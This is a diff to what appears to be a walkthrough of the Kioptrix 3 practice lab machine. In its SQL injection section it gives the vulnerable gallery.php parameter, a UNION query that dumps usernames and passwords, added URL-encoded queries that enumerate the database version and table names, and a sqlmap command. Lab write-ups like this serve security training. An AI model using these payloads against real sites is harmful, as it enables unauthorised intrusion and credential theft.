@@ -109,6 +109,12 @@ Method 1 : CMS Exploit
 Method 2 : Sql Injection
 - Point of injection : http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos (Parameter id)
 Query on browser :  UNION ALL SELECT 1,2,concat(username,char(58),password),4,5,6 FROM dev_accounts
+
+Other queries for testing: 
+# %20UNION%20SELECT%201,2,3,4,5,6
+# %20UNION%20SELECT%201,@@version,3,4,5,6
+# %20UNION%20ALL%20SELECT%201,2,group_concat%28table_name%29,4,5,6%20from%20information_schema.tables
+
  or 
 - sqlmap --wizard http://kioptrix3.com/gallery/gallery.php?id=1
 
